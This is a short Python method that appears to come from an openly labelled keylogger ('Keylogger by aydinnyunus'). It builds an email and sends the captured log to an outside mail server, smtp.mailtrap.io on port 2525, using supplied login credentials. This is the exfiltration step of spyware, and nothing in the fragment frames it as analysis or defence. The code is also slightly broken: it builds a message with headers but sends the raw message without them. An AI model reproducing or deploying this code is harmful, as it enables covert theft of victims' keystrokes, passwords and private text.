def send_mail(self, email, password, message):
            sender = "Private Person <from@example.com>"
            receiver = "A Test User <to@example.com>"

            m = f"""\
            Subject: main Mailtrap
            To: {receiver}
            From: {sender}

            Keylogger by aydinnyunus\n"""

            m += message
            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                server.login(email, password)
                server.sendmail(sender, receiver, message)
